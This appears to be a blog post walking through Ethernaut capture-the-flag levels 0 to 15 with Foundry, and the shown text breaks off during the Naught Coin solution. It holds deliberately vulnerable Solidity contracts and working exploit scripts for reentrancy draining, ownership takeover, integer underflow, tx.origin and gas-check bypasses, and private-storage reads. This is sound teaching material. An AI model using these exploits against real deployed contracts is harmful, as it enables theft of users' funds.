---
layout: post
title: "Ethernaut CTF using Foundry"
---



Install the foundry by using: [https://book.getfoundry.sh/getting-started/installation](https://book.getfoundry.sh/getting-started/installation)

Solved challenges repository: [https://github.com/BhaskarPeruri/OZ_Ethernaut](https://github.com/BhaskarPeruri/OZ_Ethernaut)

The challenge contracts are in `/src`.

Solution scripts are  in  `/script`.

Setup the .env file in the repository and fill the following required fields.

```
RPC_URL=
MY_ADDRESS=
PRIVATE_KEY=
```

## Hello Ethernaut

**Level0.sol**

We have to deploy the instance  and  call the info() method  on it  and follow the  given instructions to solve this challenge.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Instance {

  string public password;
  uint8 public infoNum = 42;
  string public theMethodName = 'The method name is method7123949.';
  bool private cleared = false;

  // constructor
  constructor(string memory _password) public {
    password = _password;
  }

  function info() public pure returns (string memory) {
    return 'You will find what you need in info1().';
  }

  function info1() public pure returns (string memory) {
    return 'Try info2(), but with "hello" as a parameter.';
  }

  function info2(string memory param) public pure returns (string memory) {
    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {
      return 'The property infoNum holds the number of the next info method to call.';
    }
    return 'Wrong parameter.';
  }

  function info42() public pure returns (string memory) {
    return 'theMethodName is the name of the next method.';
  }

  function method7123949() public pure returns (string memory) {
    return 'If you know the password, submit it to authenticate().';
  }

  function authenticate(string memory passkey) public {
    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
      cleared = true;
    }
  }

  function getCleared() public view returns (bool) {
    return cleared;
  }
}

```

**Level0Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level0.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level0Sol is Script{
    
    Instance public level0 = Instance(0x45788399AFea13881872eA360A071f86E3D946fb);
    function run() external{
        
        string memory password = level0.password();
        console.log("Password:",password);
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        level0.authenticate(password);
        vm.stopBroadcast();
    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level0Solution.s.sol:Level0Sol --rpc-url $RPC_URL --broadcast
```

## Fallback

**Level1.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//objectives --claim ownership of  the token and drain it's eth
contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;//red flag
  }
}

```

**Goal:**

We need to become  the owner of the contract and drain all the ether from it.

**Explanation:**

1. To set the owner we need to pass the require check in `receive()`.
2. To pass the check we have to send some ether with the transaction.
3. So, initially we will send contributions and then send some ether to the contract to invoke the `receive()` method.
4. Now, we can call `withdraw()` function to drain the contract.

**Level1Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level1.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level1Sol is Script{
    
    Fallback public level1 = Fallback(payable(0x6318e52C6f116694A9b99761BdbC96faE1ad5B4E));//pass the contract address deployed on the sepolia testnet
    function run() external{
        
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        level1.contribute{value: 1 wei}();
        address(level1).call{value: 1 wei}("");
        console.log("New owner:",level1.owner());
        console.log("My address:",vm.envAddress("MY_ADDRESS"));

        //once we became the owner of the contract, we can now withdraw

        level1.withdraw();

        vm.stopBroadcast();
    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level1Solution.s.sol:Level1Sol --rpc-url $RPC_URL --broadcast
```

## Fallout

**Level2.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

//objectives-- claim ownership of the contract

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

**Goal**: Claim the ownership of the contract

**Explanation:**

1. In Solidity 0.6.0, the constructor is the function with the same name as the contract. 
2. But in the given challenge, the contract name (`Fallout`) and the function name(`Fal1out`) are not the same.
3. So, we can call this function directly.

**Level2Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Level2.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level2Sol is Script{
    
    Fallout public level2 = Fallout(0xaEb939E61726c0f9d0078c3FC1C1508ABa6C26C4);
    function run() external{
        
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before",level2.owner());
        level2.Fal1out();
        console.log("Owner after",level2.owner());
        vm.stopBroadcast();
    }
}

```

**To run the script**

```
$ source .env
$ forge script script/Level2Solution.s.sol:Level2Sol --rpc-url $RPC_URL --broadcast
```

## Coin Flip

**Level3.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//objective:
// win the game 10 times at a time
contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

**Goal:**

We have to make the `consecutiveWins` to 10. We need to guess the coin flip consecutives 10 times.

**Explanation:**

1. We can implement the same logic which is used to find the `side` of the coin in the `CoinFlip` contract.
2. I  wrote a player  contract which will perform the `flip()` calculation and sends the value to the `CoinFlip` contract.
3. Since the entire computaion in  both contracts happens in same transaction, the `block.hash` and `block.number` remains same in both contracts.
4. But we need to run the player script 10 times with a small amount of time delay. Because the last blockhash should not be equal to the current blockhash. So, running script at different times will change the block of the transaction.

**Level3Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level3.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract player{
      uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

     constructor(CoinFlip _coinflipInstance){
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            _coinflipInstance.flip(side);

     } 

}
contract Level3Sol is Script{
    
    CoinFlip public level3 = CoinFlip(0x4d03165ffad46794329037004988b6De42AaC4DB);//pass the contract address deployed on the sepolia testnet
    function run() external{
        
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new player(level3);
        console.log("consecutive wins:",level3.consecutiveWins());
        vm.stopBroadcast();
    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level3Solution.s.sol:Level3Sol --rpc-url $RPC_URL --broadcast
```

## Telephone

**Level4.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

**Goal:**   Claim the ownership of the Telephone contract

**Explanation:**

1. If the `msg.sender` is equals to `tx.origin` which means the call was from a EOA. If its not, then the call is from a contract.
2. To bypass that check, I have an written an intermediary contract  which will call the `changeOwner()` function.
3. Thus `msg.sender` is our intermediary contract and `tx.origin` is our EOA.
4. Simply call the `changeOwner()` function from the intermediary contract.

**Level4Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level4.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract IntermediatoryContract{

    constructor(Telephone _telephoneInstance, address _newOwner){
        _telephoneInstance.changeOwner(_newOwner);
    }
}

contract Level4Sol is Script{

    Telephone public level4 = Telephone(0x7Ca95d4b9f0a67539f9A3586e895C67547c76190);

    function run() external{
    
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
    new IntermediatoryContract(
        level4,vm.envAddress("MY_ADDRESS")
    );

    vm.stopBroadcast();
    }
}

```

**To run the script**

```
$ source .env
$ forge script script/Level4Solution.s.sol:Level4Sol --rpc-url $RPC_URL --broadcast
```

## Token

**Level5.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

//objectives :
//1.take more than 20 tokens
contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

**Goal:**

We have initial token balance of 20, we need to take more than 20 tokens.

**Explanation:**

1. This contract uses solidity pragma `0.6.0`, in which no arithmetic overflow/underflow checks are not performed by default.
2. In `transfer()` function the require check can be bypassed when we pass value as more than 20.
3. 20 - 21 = -1 which results in `2**256 - 1`. Which is `>= 0` and the same will happens in the update of balance at sender.
4. `balances[msg.sender] -= _value;` will become balance[msg.sender] = 20 - 21 = 2**256 -1.

**Level5Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Level5.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level5Sol is Script{

    Token public level5 = Token(0xf363A66580c0E202396333d08Fc53e18cbcc625F);

    function run() external{
    
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    console.log("total supply:",level5.totalSupply());
    level5.transfer(address(0),21);
    console.log("MY balance:",level5.balanceOf(vm.envAddress("MY_ADDRESS")));
    vm.stopBroadcast();
    }
}

```

**To run the script**

```
$ source .env
$ forge script script/Level5Solution.s.sol:Level5Sol --rpc-url $RPC_URL --broadcast
```

## Delegation

**Level6.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//objective:
//claim ownership 

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

**Goal:**
Claim ownership of Delegation contract

**Explanation:**

1. `Delegation` contracts uses delegatecall to call the other contract `Delegate`.
2. One thing to remember with delegatecall is that it will maintain the `msg.sender` and `msg.value` when it calls other contract.
3. And also it updates the caller contract storage not the contract which being called.
4. So, when we call `pwn()` on the Delegation address it will forward the call to Delegate contract and updates the owner variable in Delegation contract.

**Level6Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level6.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level6Sol is Script{

    Delegation public level6 = Delegation(0xCAfBaEb598da2251121AD148766f2a6c4B4C2dB7);

    function run()  external{

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Initial Owner : ", level6.owner());
        
        address(level6).call(abi.encodeWithSignature("pwn()"));

        console.log("Final Owner : ", level6.owner());
        vm.stopBroadcast();

    }

}
```

**To run the script**

```
$ source .env
$ forge script script/Level6Solution.s.sol:Level6Sol --rpc-url $RPC_URL --broadcast
```

## Force

**Level7.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

**Goal:**

We need to make the balance of the Force contract more than 0.

**Explanation:**

1. There is no `receive()/fallback()` function and no payable functions in the Force contract.
2. If we send any ether to this contract it will be reverted.
3. One thing ,  we can  do is that  deploy a contract with some ether and implement a `selfdestruct` function and pass the recepient as the `Force` contract address.
4. Upon selfdestruct of the Attack contract, Force contract will receive ether.

**Level7Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ToBeDestructed{
    constructor(address payable _forceAddress) payable{
        selfdestruct(_forceAddress);
    }
}

contract Level7Sol is Script{
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ToBeDestructed{value: 1 wei}(payable(0x562488c3a3f2208737b860fF335cfBc3CD306865));
        vm.stopBroadcast();
    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level7Solution.s.sol:Level7Sol --rpc-url $RPC_URL --broadcast
```

## Vault

**Level8.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

**Goal:**

We need to unlock the vault.

**Explanation**:

1. We can simply call the `unlock()` function with password. But the password was not publicly accessible.
2. Declaring a variable `private` doesn’t mean that no one can read that variable. Only the other contracts which interacts with it won’t able to view that variable.
3. We can solve this by two ways, one is using with foundry `vm.load` and another is using with blockchain explorer(Sepolia Etherscan). 
4. I used  `vm.load`. in foundry.

**Level8Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level8.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level8Sol is Script{
     
     Vault public level8 = Vault(0x826c120B1C2b48fd2ad8C7015BcbfFe33A851E7A);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 password = vm.load(address(level8), bytes32(uint256(1)));
        console.logBytes32(password);
        level8.unlock(password);

        vm.stopBroadcast();
    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level8Solution.s.sol:Level8Sol --rpc-url $RPC_URL --broadcast
```

## King

**Level9.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

**Goal:**

Be the `King` and make others dont claim the `King` position again.

**Explanation:**

1. Initially check the `prize` amount that need to send to be the king. And send the `prize` amount to the `King` contract.
2. When someone send the `prize` amount back to us to claim the king position, we can deny the money.
3. So, that they wont be the king anymore.
4. In order to deny the prize, we can write a contract which sends prize to the king contract and dont implement any `receive()/fallback()` function.
5. This will revert others transaction when they sends prize to us, So, we will remain as the king.

**Level9Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level9.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack{

    constructor(King _kingInstance) payable {
        address(_kingInstance).call{value:_kingInstance.prize()}("");//calling the receiver function in King contract
    }
    //since there is no fallback or receive function in this contract ,we can successfully denied the money
}

contract Level9Sol is Script{

    King public kingInstance = King(payable(0xb6Db4938daB72C9e2DF8a19eE5846D2692872441));

    function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    
    console.log("first King is :",kingInstance._king());
    console.log("first prize is:",kingInstance.prize());
  
    new Attack{value:kingInstance.prize()}(kingInstance);

    console.log("second King is :",kingInstance._king());
    console.log("second prize is:",kingInstance.prize());

    vm.stopBroadcast();

    }

}

```

**To run the script**

```
$ source .env
$ forge script script/Level9Solution.s.sol:Level9Sol --rpc-url $RPC_URL --broadcast
```

## Reentrancy

**Level10.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

```

**Goal:**

Drain all the ether of the Reentrance contract.

**Explanation**:

1. The `withdraw()` function is vulnerable to `Reentrancy`, as it is updating the user balance after the external call.
2. One could deposit some ether to pass the require check in withdraw and and call the withdraw from a contract in which a fallback function is implemented in such a way that it is re entered into withdraw again.
3. So, we will donate some ether to the contract and then call withdraw from a contract.
4. The withdraw call send our ether back and invokes the fallback or receive function of our contract.
5. We can call the `withdraw()` function again from the fallback function to reenter again into `Reentrance` contract.
6. Still we can manage to pass require check as our balance wasn’t updated yet.
7. We need to check the balance of the `Reentrance` contract before reentering because when we call the withdraw again after the balance of `Reentrance` becomes zero will revert the entire transaction.

**Level10Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Level10.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack{

    Reentrance public r_instance =Reentrance(0x1e5f76396a5b433c9c462c919dAf64Eed6bD4926);

    function exploit() external payable{

        r_instance.donate{value: 0.001 ether}(address(this));
        r_instance.withdraw(0.001 ether);
    }
    receive() external payable{
        if(address(r_instance).balance >= 0.001 ether){
             r_instance.withdraw(0.001 ether);
        }
    }
}

contract Level10Sol is Script{
    function run() external {
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            new Attack().exploit{value: 0.001 ether}();
            vm.stopBroadcast();
    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level10Solution.s.sol:Level10Sol --rpc-url $RPC_URL --broadcast
```

## Elevator

**Level11.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

**Goal:**

We need to get to the top floor, i.e make the top boolean to `true`.

**Explanation:**

1. The Elevator calling the `isLastFloor()` function on `msg.sender` which is insecure. Dont trust the unknown libraries or contract while making the calls.
2. The `top` variable is being updated upon the return value of the `isLastFloor()` function.
3. But, To pass the `if` condition the `isLastFloor()` should return the `false`. But the `top` will become `false` only if it results false everytime.
4. We can observe that the `isLastFloor()` function is being called twice. So, we can write a contract which implements `isLastFloor()` function in such a way that is returns `false` on first call and `true` on second call.
5. So, that the `if` condition satisfies  and `top` will be updated to true.

**Level11Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level11.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level11Sol is Script{
     Elevator public instance = Elevator(0x8Ad804B2A6907983267C2ef6A962d50F5C63A694);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         new Attack().exploit();
        vm.stopBroadcast();
    }
}
contract Attack{
    Elevator public instance = Elevator(0x8Ad804B2A6907983267C2ef6A962d50F5C63A694);
    uint public floor;
    function exploit() external{
        instance.goTo(3);
    }
    function isLastFloor(uint _floor)external returns(bool){
        if(floor == _floor){
            return true;           
        }
         floor = _floor;
        return false;
    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level11Solution.s.sol:Level11Sol --rpc-url $RPC_URL --broadcast
```

## Privacy

**Level12.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

```

**Goal:**

We need to unlock the contract, i.e call `unlock()` function with right password.

**Explanation:**

1. This challenge is similar to `Vault`. But we need to understand the storage layout of this contract and query the exact passwor storage slot of the contract.
2. The storage layout of contract as follows :
    
    ```solidity
    `bool public locked = true;                                  // slot 0
    uint256 public ID = block.timestamp;                        // slot 1
    uint8 private flattening = 10;                              // slot 2
    uint8 private denomination = 255;                           // slot 2
    uint16 private awkwardness = uint16(block.timestamp);       // slot 2
    bytes32[3] private data;  // data[0] => slot 3`  
                              // data[1] => slot 4'
                              // data[2] => slot 5`
    ```
    
3. Password is the lower 16 bytes of the `data[2]`, i.e `require(_key == bytes16(data[2]));`
4. Since the `data[2]` stored at slot 5, we can query it with `vm.load` cheatcode.
5. Calling unlock with this password will solve the challenge.

**Level12Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level12.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level12Sol is Script{

    Privacy public instance = Privacy(0x80AeDd671Abb04118998A8baAd7B879aA53756f9) ;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 slot5_data = vm.load(address(instance),bytes32(uint256(5)));
        instance.unlock(bytes16(slot5_data));

        vm.stopBroadcast();
    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level12Solution.s.sol:Level12Sol --rpc-url $RPC_URL --broadcast
```

## Gatekeeper One

**Level13.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

**Goal:**

Make it past the gatekeeper and register as an entrant to pass this level.

**Explanation:**

1. We have to call the `enter()` function, without being revert by modifier checks.
2. We need to pass three modifier checks. We can simply pass `gateOne()` by calling it from another contract.
3. To bypass `gateTwo()` we need to send exact `gas` that should result the modulo 8191 to zero.
4. `gasLeft()` is a method which calculates the remaining gas after executing instructions before it invoked.
5. We can pass the amount of gas to be transferred to the external call. But we need to send exact amount of gas.
6. One thing that we can do is bruteforce. By randomly bruteforcing with different values of gas, we can pass this modifier check.
7. To pass the `gateThree()` we need to some calculations. It takes the `_gateKey` a bytes8 value as argument.
8. The modifiers checks the lower 32 bits of the gatekey after converting to uint64.
9. So, we can calculate the lower 16 bits of the `tx.orgin` and pad it with zeros to pass the gatThree and gateOne.
10. Two pass the gateTwo we can add random bits to the MSB position.

**Level13Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level13.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    GatekeeperOne public instance =
        GatekeeperOne(0xd216C1041909516Dd89a471ECdb96aB3E7ae4Abd);

    function exploit() external {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &
            0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            uint256 totalgas = i + (8191 * 3);
            (bool success, ) = address(instance).call{gas: totalgas}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}

contract Level13Sol is Script {
    GatekeeperOne public instance =
        GatekeeperOne(0xd216C1041909516Dd89a471ECdb96aB3E7ae4Abd);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Attack().exploit();

        vm.stopBroadcast();
    }
}

```

**To run the script**

```
$ source .env
$ forge script script/Level13Solution.s.sol:Level13Sol --rpc-url $RPC_URL --broadcast
```

## Gatekeeper Two

**Level14.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

**Goal:**

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level

**Explanation:**

1. Similiar to gatekeeper one, to pass `gateOne()` here we need to call from a contract.
2. `gateTwo()` checks that the caller contract code should zero. 
3. Code inside contract constructor won’t be stored on blockchain. So, we can call the `enter()` from our attack contract constructor.
4. To pass the `gateThree()` we need to do simple XOR operation. To get the `gateKey()` we need to do `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))` XOR `type(uint64).max`.

```
We know that
 
//If x ^ y = z then x ^ z = y
```


Level14Solution.s.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level14.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack{
    constructor(){ 
        GatekeeperTwo  instance = GatekeeperTwo(0xc3FB4c38f398050206ea0D07D18D693Bc75888AA) ;
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        instance.enter(gateKey);
    }   
}
contract Level14Sol is Script{
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack();
        vm.stopBroadcast();
    }
}

```

**To run the script**

```
$ source .env
$ forge script script/Level14Solution.s.sol:Level14Sol --rpc-url $RPC_URL --broadcast
```

## Naught Coin

**Level15.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
}
```

**Goal:**

NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

**Explanation:**

1. NaughtCoin imports ERC20 contract. So, it consists of all the function of ERC20 contract also.
2. NaughtCoin only implemented the `lockTokens()` modifier on `transfer()` function only.
3. There are other ways to transfer tokens from one address to other without using `transfer()`
4. Player can approve the allowances of their tokens to someone, and they can use `transferFrom()` function to transfer tokens on behalf of player.

**Level15Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level15.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    NaughtCoin public instance =
        NaughtCoin(0x4850cbcf544F3055b6269C54C5e9bD1Ec0905EE2);
    function exploit(address _player) public {
        require(instance.allowance(_player, address(this))    > 0, "Not approved");
        require(
            instance.transferFrom(
                _player,
                address(this),
                instance.balanceOf(_player)
            ),
            "Transfer to attacker failed"
        );
    }
}

